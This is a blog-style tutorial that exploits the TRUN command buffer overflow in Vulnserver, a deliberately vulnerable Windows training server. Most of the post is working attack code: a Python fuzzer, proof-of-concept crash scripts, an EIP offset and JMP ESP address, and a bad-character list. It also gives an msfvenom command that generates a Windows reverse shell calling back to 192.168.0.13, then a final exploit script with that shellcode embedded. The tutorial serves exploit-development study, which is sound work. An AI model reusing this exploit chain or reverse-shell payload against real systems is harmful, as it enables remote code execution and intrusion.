---
layout: post
title:  "Windows-Based Exploitation — VulnServer TRUN Command Buffer Overflow"
date:   2019-07-08 9:07:10 -0700
categories: [security]
---

### Vulnserver.exe


> Vulnserver is a multithreaded Windows based TCP server that listens for client connections on port 9999 (by default) and allows the user to run a number of different commands that are vulnerable to various types of exploitable buffer overflows.

before we trying to exploit lets explore how this problem works. We identify that this program is a tiny server which exposes a set of commands 

![help](/static/img/01/help.png)

lets disassembly our TRUN command . how it looks like and it is comparing if it is equal to `TRUN` by calling `_strncmp` . So lets add a breakpoint at the top the block ,and dig more 

![TRUN](/static/img/01/TRUN_command.png)

we notify it's checking if the first character of the remaining input is `2EH` which is translated to ASCII as `.`

![dot](/static/img/01/dot.png)


Let’s debug again but now with an input that starts with a `.`.

By stepping over a bit further there is an interesting function being called which is named `_Function3`. using `F7` to step into the function we can see that the function copies the content , but there are not any checks for buffer boundaries. literally we could overwrite it 

![vulnerable](/static/img/01/vulnerable.png)


### Fuzzing the Vulnserver

we write a simple Fuzzer to replicate the check unexpected crashes incrementing by 200 bytes each time with the following code:
```python
#!/usr/bin/python
import socket

buffer=["A"]
counter=100
while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+200

for string in buffer:
  print "Fuzzing PASS with %s bytes" % len(string)
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.0.27',9999))
  s.recv(1024)
  s.send(('TRUN .' + string + '\r\n'))
  s.recv(1024)
  s.send('EXIT\r\n')
  s.close()
  ```

we can see the Vulnserver stop working at 2100 bytes.

![Vulnserver](/static/img/01/1.png)

* Replicating the Crash *

From our fuzzer output, we can deduce that Vulnserver has a buffer overflow vulnerability
when a TRUN command with a random strings about 2100 bytes is sent to it.

```python
#!/usr/bin/python
import socket
import struct


payload = 'A' * 2100 

try:
    print "\nSending tons of random bytes..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.0.24',9999))
    s.recv(1024)
    s.send(('TRUN .' + payload + '\r\n'))
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close()
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 9999 for some reason..."
```

### Controlling EIP 

We sent 2100 'A' characters and EIP was overwritten with 41414141, which is the hex code of the 'A' character. EIP was overwritten with our buffer. If we find the position of the EIP in our buffer, then we can overwrite it with any value.


![Vulnserver_1](/static/img/01/2.png)


to check the exact match of our crash execute the another tool called gdb-peda with the following 

![Vulnserver_2](/static/img/01/3.png)


Update the PoC script the following: First send 2006 A character, then send 4 B, then C characters.

```python 
#!/usr/bin/python
import socket
import struct

payload = 'A' * 2006 + "B" * 4 + "C" * (3500-2006-4)

try:
    print "\nSending tons of random bytes..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.0.24',9999))
    s.recv(1024)
    s.send(('TRUN .' + payload + '\r\n'))
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close()
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 9999 for some reason..."

```

### Check bad characters

Depending on the application, vulnerability type, and protocols in use, there may be
certain characters that are considered “bad” and should not be used in your buffer,
return address, or shellcode

we generate a bytearray from the immunity debugger:

![Vulnserver_3](/static/img/01/4.png)

the bytearray generated from immunity debugger we update our PoC with them to see what are our bad chars

```python
#!/usr/bin/python
import socket
import struct

badchars =  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a"
badchars += "\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15"
badchars += "\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b"
badchars += "\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36"
badchars += "\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
badchars += "\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
badchars += "\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57"
badchars += "\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
badchars += "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d"
badchars += "\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
badchars += "\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83"
badchars += "\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
badchars += "\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99"
badchars += "\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4"
badchars += "\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
badchars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba"
badchars += "\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5"
badchars += "\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb"
badchars += "\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6"
badchars += "\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1"
badchars += "\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc"
badchars += "\xfd\xfe\xff"

payload = 'A' * 2006 + "B" * 4 + "C" * (3500-2006-4-len(badchars))

try:
    print "\nSending tons of random bytes..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.0.24',9999))
    s.recv(1024)
    s.send(('TRUN .' + payload + '\r\n'))
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close()
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 9999 for some reason..."
```

we lauch our PoC and check the output

![Vulnserver_4](/static/img/01/5.png)


we have a badchar ```0x00``` , but I will need to check if there are any other bad char repeating the same process again.

we genarate our new bytearray , but execluding our bad char from the first output.

``` !mona bytearray -cpb "\x00" ```

we compare again if any byte were modified from the crash to see our badchar, and we don't have anyother badchar 

![Vulnserver_5](/static/img/01/7.png)


# Redirecting the Execution Flow

In this step we have to check the registers and the stack. We have to find a way to jump to our buffer to execute our code. ESP points to the beginning of the C part of our buffer. We have to find a JMP ESP or CALL ESP instruction. Do not forget, that the address must not contain bad characters!

![Vulnserver_6](/static/img/01/8.png)


### Generating Shellcode with Metasploit

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=8080 -b "\x00" -f python -v shellcode 

Place the generated code into the PoC script and update the buffer, so that the shellcode is placed after the EIP, in the C part. Place some NOP instructions before the shellcode. (NOP = 0x90) The final exploit:

```python 
#!/usr/bin/python
import socket
import struct

shellcode =  ""
shellcode += "\xb8\xc5\x97\xc9\x70\xdb\xc1\xd9\x74\x24\xf4\x5b"
shellcode += "\x2b\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x06"
shellcode += "\x93\x2b\x85\x74\x74\x29\x66\x84\x85\x4e\xee\x61"
shellcode += "\xb4\x4e\x94\xe2\xe7\x7e\xde\xa6\x0b\xf4\xb2\x52"
shellcode += "\x9f\x78\x1b\x55\x28\x36\x7d\x58\xa9\x6b\xbd\xfb"
shellcode += "\x29\x76\x92\xdb\x10\xb9\xe7\x1a\x54\xa4\x0a\x4e"
shellcode += "\x0d\xa2\xb9\x7e\x3a\xfe\x01\xf5\x70\xee\x01\xea"
shellcode += "\xc1\x11\x23\xbd\x5a\x48\xe3\x3c\x8e\xe0\xaa\x26"
shellcode += "\xd3\xcd\x65\xdd\x27\xb9\x77\x37\x76\x42\xdb\x76"
shellcode += "\xb6\xb1\x25\xbf\x71\x2a\x50\xc9\x81\xd7\x63\x0e"
shellcode += "\xfb\x03\xe1\x94\x5b\xc7\x51\x70\x5d\x04\x07\xf3"
shellcode += "\x51\xe1\x43\x5b\x76\xf4\x80\xd0\x82\x7d\x27\x36"
shellcode += "\x03\xc5\x0c\x92\x4f\x9d\x2d\x83\x35\x70\x51\xd3"
shellcode += "\x95\x2d\xf7\x98\x38\x39\x8a\xc3\x54\x8e\xa7\xfb"
shellcode += "\xa4\x98\xb0\x88\x96\x07\x6b\x06\x9b\xc0\xb5\xd1"
shellcode += "\xdc\xfa\x02\x4d\x23\x05\x73\x44\xe0\x51\x23\xfe"
shellcode += "\xc1\xd9\xa8\xfe\xee\x0f\x7e\xae\x40\xe0\x3f\x1e"
shellcode += "\x21\x50\xa8\x74\xae\x8f\xc8\x77\x64\xb8\x63\x82"
shellcode += "\xef\x07\xdb\x8c\xe2\xef\x1e\x8c\xe3\x7f\x97\x6a"
shellcode += "\x71\x90\xfe\x25\xee\x09\x5b\xbd\x8f\xd6\x71\xb8"
shellcode += "\x90\x5d\x76\x3d\x5e\x96\xf3\x2d\x37\x56\x4e\x0f"
shellcode += "\x9e\x69\x64\x27\x7c\xfb\xe3\xb7\x0b\xe0\xbb\xe0"
shellcode += "\x5c\xd6\xb5\x64\x71\x41\x6c\x9a\x88\x17\x57\x1e"
shellcode += "\x57\xe4\x56\x9f\x1a\x50\x7d\x8f\xe2\x59\x39\xfb"
shellcode += "\xba\x0f\x97\x55\x7d\xe6\x59\x0f\xd7\x55\x30\xc7"
shellcode += "\xae\x95\x83\x91\xae\xf3\x75\x7d\x1e\xaa\xc3\x82"
shellcode += "\xaf\x3a\xc4\xfb\xcd\xda\x2b\xd6\x55\xea\x61\x7a"
shellcode += "\xff\x63\x2c\xef\xbd\xe9\xcf\xda\x82\x17\x4c\xee"
shellcode += "\x7a\xec\x4c\x9b\x7f\xa8\xca\x70\xf2\xa1\xbe\x76"
shellcode += "\xa1\xc2\xea"

payload = 'A' * 2006 + struct.pack("<L",0x625011AF) + '\x90' * 16 + shellcode

try:
    print "\nSending tons of random bytes..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.0.24',9999))
    s.recv(1024)
    s.send(('TRUN .' + payload + '\r\n'))
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close()
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 9999 for some reason..."

```

Done! Wonder if we got that shell back?


![Vulnserver_7](/static/img/01/9.png)
